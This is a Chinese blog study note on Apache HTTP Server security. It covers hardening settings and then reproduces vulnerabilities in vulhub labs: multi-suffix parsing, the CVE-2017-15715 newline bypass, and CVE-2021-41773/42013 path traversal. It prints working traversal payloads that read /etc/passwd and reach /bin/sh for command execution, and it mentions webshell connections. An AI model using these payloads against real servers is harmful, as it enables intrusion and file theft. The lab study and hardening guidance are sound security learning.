@@ -1,0 +1,121 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="xiaobai,490751327@qq.com"><title>Web中间件安全-Apache篇 · 别来无恙</title><meta name="description" content="Apahce一、学习要点1、简介Apache是世界使用排名第一的web服务器软件。Apache自身的安全性较高，但是人为的错误设置会导致Apache产生安全问题。
+2、学习要点
+当前Apache服务器的运行权限
+修改Apache服务器控制目录及权限
+修改Apache服务器错误页面重定向的方法
+设置隐"><meta name="keywords" content="网络安全学习"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><meta name="generator" content="Hexo 5.4.1"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">别来无恙</a></h3><div class="description"><p>相信美好的事物即将发生！</p></div></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a target="_blank" rel="noopener" href="https://www.caicai.me"> CaiCai </a><span>&</span><a target="_blank" rel="noopener" href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/links">友链</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/duck.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>Web中间件安全-Apache篇</a></h3></div><div class="post-content"><h3 id="Apahce"><a href="#Apahce" class="headerlink" title="Apahce"></a>Apahce</h3><h4 id="一、学习要点"><a href="#一、学习要点" class="headerlink" title="一、学习要点"></a>一、学习要点</h4><h5 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h5><p>Apache是世界使用排名第一的web服务器软件。Apache自身的安全性较高，但是人为的错误设置会导致Apache产生安全问题。</p>
+<h5 id="2、学习要点"><a href="#2、学习要点" class="headerlink" title="2、学习要点"></a>2、学习要点</h5><ul>
+<li>当前Apache服务器的运行权限</li>
+<li>修改Apache服务器控制目录及权限</li>
+<li>修改Apache服务器错误页面重定向的方法</li>
+<li>设置隐藏apahce服务版本号</li>
+<li>设置web目录的读写权限，脚本执行权限的方法</li>
+<li>设置日志记录文件、记录内容和记录格式</li>
+<li>Apche服务解析漏洞的利用方式</li>
+<li>Apache服务器文件名解析漏洞的防御措施</li>
+</ul>
+<h5 id="3、目录结构"><a href="#3、目录结构" class="headerlink" title="3、目录结构"></a>3、目录结构</h5><p>默认网站根目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html</span><br></pre></td></tr></table></figure>
+<p>默认配置文件夹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/apache2</span><br></pre></td></tr></table></figure>
+<p>配置文件解读：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apche2.conf：Apche2的主要配置文件，包含全部的配置。</span><br><span class="line">conf-available：包含可用的配置文件。</span><br><span class="line">conf-enabled：保存符号链接到conf-available文件。</span><br><span class="line">envvars：Apche环境变量设置。</span><br><span class="line">ports.conf：监听端口配置文件。</span><br><span class="line">mods-available：包含配置文件装载的模块。</span><br><span class="line">mods-enabled：保存符号链接到mods-available文件。</span><br></pre></td></tr></table></figure>
+
+<h4 id="二、服务安装"><a href="#二、服务安装" class="headerlink" title="二、服务安装"></a>二、服务安装</h4><h5 id="1、安装启动命令"><a href="#1、安装启动命令" class="headerlink" title="1、安装启动命令"></a>1、安装启动命令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install apche2  \\安装apche2</span><br><span class="line">sudo apt-get remove apache2  \\卸载apche2</span><br><span class="line">sudo /etc/init.d/apache2 start  \\启动apache2</span><br><span class="line">sudo /etc/init.d/apache2 stop  \\停止apache2</span><br><span class="line">sudo /etc/init.d/apache2 restart  \\重启apache2</span><br></pre></td></tr></table></figure>
+
+<h4 id="三、配置方法"><a href="#三、配置方法" class="headerlink" title="三、配置方法"></a>三、配置方法</h4><h5 id="1、配置服务器运行权限"><a href="#1、配置服务器运行权限" class="headerlink" title="1、配置服务器运行权限"></a>1、配置服务器运行权限</h5><p>查看执行权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lsof -i:80  //查看apche执行权限</span><br><span class="line">ps aux | grep apache | grep -v grep  //查看apache执行权限</span><br><span class="line"># 第一个为apche主进程以root权限运行（Linux中小于1024端口需要root权限）</span><br></pre></td></tr></table></figure>
+<p>修改执行用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/apche2/apche2.conf</span><br><span class="line"># 查看115、116行配置指定的用户</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/apache2/ennvar</span><br><span class="line"># 修改16、17行为以下内容</span><br><span class="line">export APACHE_RUN_USER=&lt;user&gt;</span><br><span class="line">export APACHE_RUN_GROUP=&lt;usergroup&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>安全配置：</strong> 将用户启动权限设置为非管理员权限（windows默认为管理员原权限）</p>
+<h5 id="2、控制目录及权限"><a href="#2、控制目录及权限" class="headerlink" title="2、控制目录及权限"></a>2、控制目录及权限</h5><p>Linux在默认情况下如果当前目录不存在默认文件，Apache会列出当前目录。<br>查看配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/apache2/apche2.conf</span><br><span class="line"># 查看170-173行配置</span><br></pre></td></tr></table></figure>
+<p>配置意图如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory&gt; # 要设置权限的目录路径</span><br><span class="line">	options Indexes,FollowSymLinks  # 设置服务器特性</span><br><span class="line">	AllowOverride None # 指定是否使用.htaccess文件</span><br><span class="line">	Require all granted # 允许所有请求</span><br><span class="line">	DirectoryIndex &lt;page&gt; # 设置该站点的&quot;默认网页&quot;，可以设置多个，用于请求的时候没有带请求文件名默认访问的网页</span><br></pre></td></tr></table></figure>
+<p><strong>安全配置：</strong> 将options设置为None防止目录泄露。同时将上传等目录权限设置为可写无法读取无法执行。</p>
+<h5 id="3、错误重定向"><a href="#3、错误重定向" class="headerlink" title="3、错误重定向"></a>3、错误重定向</h5><p>错误重定向是指通过在web程序出错令其跳转到指定的显示界面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/apache2/apche2.conf</span><br><span class="line"># 查看170-173行配置</span><br></pre></td></tr></table></figure>
+<p>添加如下配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ReWriteEngine On # 开启跳转，符合正则就进行跳转</span><br><span class="line">ReWriteRule &lt;grep&gt; &lt;page&gt; # 设置跳转规则</span><br></pre></td></tr></table></figure>
+
+<h5 id="4、隐藏版本号"><a href="#4、隐藏版本号" class="headerlink" title="4、隐藏版本号"></a>4、隐藏版本号</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/apche2/conf-available/security.conf</span><br><span class="line"># 修改25、26行为以下内容</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ServerTokens Prod</span><br><span class="line">ServiceSignature OFF</span><br></pre></td></tr></table></figure>
+
+<h5 id="5、禁止执行脚本"><a href="#5、禁止执行脚本" class="headerlink" title="5、禁止执行脚本"></a>5、禁止执行脚本</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/apache2/apache2.conf</span><br><span class="line"># 在配置文件中添加如下配置</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Direcoty /var/www/html/upload&gt; # 指定需要配置的目录</span><br><span class="line">	php_flag engine off</span><br><span class="line">&lt;/Direcoty&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="6、日志文件"><a href="#6、日志文件" class="headerlink" title="6、日志文件"></a>6、日志文件</h5><p>默认日志文件路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/log/apache2</span><br></pre></td></tr></table></figure>
+<p>日志文件格式定义：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogFormat &quot;%h %l %u %t &quot;%r&quot; %&gt;s %O &quot;%&#123;Referer&#125;i&quot; &quot;%&#123;User-Agent&#125;i&quot;&quot; combined</span><br></pre></td></tr></table></figure>
+<p>参数解读：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">%h：远端主机地址；</span><br><span class="line">%l：远端登录名(由identd而来)，需要IdentityCheck设为&quot;On&quot;，否则将得到一个&quot;-&quot;；</span><br><span class="line">%u：远程用户名(根据验证信息而来)，若不存在得到一个&quot;-&quot;；</span><br><span class="line">%t：时间，用普通日志时间格式(标准英语格式) ；</span><br><span class="line">&quot;%r&quot;：请求头的第一行；</span><br><span class="line">%&gt;s：请求响应的状态码；</span><br><span class="line">%O：发送的字节数，包括请求头的数据，并且不能为零；</span><br><span class="line">&quot;%&#123;Referer&#125;i&quot;该请求来源页面；</span><br><span class="line">&quot;%&#123;User-Agent&#125;i&quot;该请求使用的浏览器信息。</span><br></pre></td></tr></table></figure>
+<p>示例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 - - [11/Mar/2022:09:17:23 -0500] &quot;GET / HTTP/1.1&quot; 200 3380 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="四、漏洞复现"><a href="#四、漏洞复现" class="headerlink" title="四、漏洞复现"></a>四、漏洞复现</h4><h5 id="1、Apache多后缀解析漏洞"><a href="#1、Apache多后缀解析漏洞" class="headerlink" title="1、Apache多后缀解析漏洞"></a>1、Apache多后缀解析漏洞</h5><p><strong>漏洞原因：</strong><br>Apache文件解析漏洞涉及到解析文件的特性。Apache默认一个文件可以有多个点进行分割后缀，当右边的后缀无法识别时则向左继续匹配。</p>
+<p><strong>漏洞修复：</strong><br>在httpd.conf添加以下语句禁止<strong>php</strong>的访问权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;.(php.|php3.|php4.|php5.)&quot;&gt;</span><br><span class="line">Order Deny,Allow</span><br><span class="line">Deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞复现：</strong><br>环境启动：<br>进入&#x2F;vulhub&#x2F;httpd&#x2F;apache_parsing_vulnerability路径执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d  \\启动漏洞环境</span><br><span class="line">docker-compose down  \\关闭漏洞环境</span><br></pre></td></tr></table></figure>
+
+<p>漏洞利用：<br>①、访问页面进行上传文件</p>
+<img src="/2022/03/18/apache/95f1b0f32869ca18c9f1049fed2508e4.png" class="">
+
+<p>②、修改后缀进绕过检测</p>
+<img src="/2022/03/18/apache/90e79cf664b989174da4f268265f7d30.png" class="">
+
+<p>③、使用蚁剑进行连接</p>
+<img src="/2022/03/18/apache/092fb23407add9559b8903ae1583ed94.png" class="">
+
+
+<h5 id="2、正则过滤解析漏洞"><a href="#2、正则过滤解析漏洞" class="headerlink" title="2、正则过滤解析漏洞"></a>2、正则过滤解析漏洞</h5><p><strong>漏洞原因：</strong><br>在正则表达式中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$：匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 \$。</span><br></pre></td></tr></table></figure>
+<p>$会匹配到字符串结尾的换行符。所以如果在上传时，添加一个换行符也能呗正常解析，并且能够绕过系统的黑名单检测。</p>
+<p><strong>漏洞复现：</strong><br>环境启动：<br>进入&#x2F;vulhub&#x2F;httpd&#x2F;CVE-2017-15715路径执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d  \\启动漏洞环境</span><br><span class="line">docker-compose down  \\关闭漏洞环境</span><br></pre></td></tr></table></figure>
+
+<p>漏洞利用：<br>①、多后缀上传成功</p>
+<img src="/2022/03/18/apache/47632606a6b2dacadc28acffa81774b4.png" class="">
+
+<p>②、浏览发现未进行解析</p>
+<img src="/2022/03/18/apache/6c0bb346b31ee249b2b80d415c4fb544.png" class="">
+
+<p>③、数据中插入换行符进行上传</p>
+<img src="/2022/03/18/apache/d46e52cad83ffa97fad6dafbdfc9b3f3.png" class="">
+
+<p>④、使用蚁剑进行连接</p>
+<img src="/2022/03/18/apache/811e0eb8a9413e67ae8bdce8395809fc.png" class="">
+
+
+<h5 id="3、路径遍历漏洞"><a href="#3、路径遍历漏洞" class="headerlink" title="3、路径遍历漏洞"></a>3、路径遍历漏洞</h5><p><strong>漏洞原因：</strong><br><strong>Apache HTTP Server 2.4.49</strong>版本使用的ap_normalize_path函数在对路径参数进行规范化时会先进行url解码，然后判断是否存在…&#x2F;的路径穿越符。<br>当路径出现.%2e&#x2F;这种形式时，不会检测到路径遍历。原因是在遍历到第一个字符时，此时检测到后面的两个字符是%2而不是.&#x2F;，不会把它当作路径穿越符处理。因此可以使用.%2e&#x2F;或者%2e%2e绕过对路径穿越符的检测。</p>
+<p><strong>漏洞复现：</strong><br>环境启动：<br>进入&#x2F;vulhub&#x2F;httpd&#x2F;CVE-2021-41773路径执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d  \\启动漏洞环境</span><br><span class="line">docker-compose down  \\关闭漏洞环境</span><br></pre></td></tr></table></figure>
+
+<p>漏洞利用：<br>①、直接使用漏洞利用的payload进行请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br></pre></td></tr></table></figure>
+<img src="/2022/03/18/apache/3ddf8e4e7af5ba80a7e7d0b3917e0976.png" class="">
+
+<p>②、利用超越漏洞进行执行命令</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure>
+<img src="/2022/03/18/apache/b28f53f9626ad017772ebfc1675923c9.png" class="">
+
+
+<h5 id="4、路径遍历漏洞"><a href="#4、路径遍历漏洞" class="headerlink" title="4、路径遍历漏洞"></a>4、路径遍历漏洞</h5><p><strong>漏洞原因：</strong><br><strong>Apache HTTP Server 2.4.50</strong>版本对CVE-2021-41773的修复可以避免一次url编码导致的路径穿越，但是由于在请求处理过程中，还会调用ap_unescape_url函数对参数再次进行解码，仍然会导致路径穿越。</p>
+<p><strong>漏洞复现：</strong><br>环境启动：<br>进入&#x2F;vulhub&#x2F;httpd&#x2F;CVE-2021-41773路径执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d  \\启动漏洞环境</span><br><span class="line">docker-compose down  \\关闭漏洞环境</span><br></pre></td></tr></table></figure>
+
+<p>漏洞利用：<br>①、直接使用漏洞利用的payload进行请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/icons/.%%32e/.%%32e/.%%32e/.%%32e/etc/passwd</span><br></pre></td></tr></table></figure>
+<img src="/2022/03/18/apache/1cd209c33a28c3e525fe0772125adec2.png" class="">
+
+
+<p>②、利用超越漏洞进行执行命令</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/bin/sh</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure>
+<img src="/2022/03/18/apache/5a740c32410771c8b937f470f6538771.png" class="">
+</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-03-18</span><i class="fa fa-tag"></i><a class="tag" href="/categories/Web中间件安全/" title="Web中间件安全">Web中间件安全 </a><a class="tag" href="/categories/Web中间件安全/Apache/" title="Apache">Apache </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2022/03/18/apache/,别来无恙,Web中间件安全-Apache篇,;"></a></div></div><div class="pagination"><ul class="clearfix"></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
